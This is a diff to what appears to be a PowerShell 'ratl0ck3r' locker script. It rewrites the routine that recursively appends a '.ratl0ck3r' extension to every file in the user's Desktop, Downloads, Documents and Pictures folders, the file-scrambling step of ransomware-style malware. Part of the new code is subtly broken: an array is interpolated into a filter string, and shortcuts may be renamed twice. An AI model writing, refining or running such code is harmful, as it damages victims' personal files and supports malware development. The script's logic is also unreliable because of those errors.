@@ -62,7 +62,16 @@ Add-Type -TypeDefinition $code
 Start-Sleep -Milliseconds 500
 
 # Add ratl0ck3r extension
-Get-ChildItem "$HOME\Desktop\*" | Rename-Item -NewName { $_.Name + ".ratl0ck3r" }
-Get-ChildItem "$HOME\Downloads\*" | Rename-Item -NewName { $_.Name + ".ratl0ck3r" }
-Get-ChildItem "$HOME\Documents\*" | Rename-Item -NewName { $_.Name + ".ratl0ck3r" }
-Get-ChildItem "$HOME\Pictures\*" | Rename-Item -NewName { $_.Name + ".ratl0ck3r" }
+$desktopPath = "$HOME\Desktop"
+$downloadsPath = "$HOME\Downloads"
+$documentsPath = "$HOME\Documents"
+$picturesPath = "$HOME\Pictures"
+
+$shortcutExtensions = @(".lnk", ".url")
+$extensionsToAdd = ".ratl0ck3r"
+
+$shortcutItems = Get-ChildItem -Path $desktopPath -Filter "*$shortcutExtensions" -File -Recurse
+$shortcutItems | Rename-Item -NewName { $_.Name + $extensionsToAdd }
+
+$items = Get-ChildItem -Path $desktopPath, $downloadsPath, $documentsPath, $picturesPath -File -Recurse
+$items | Rename-Item -NewName { $_.Name + $extensionsToAdd }
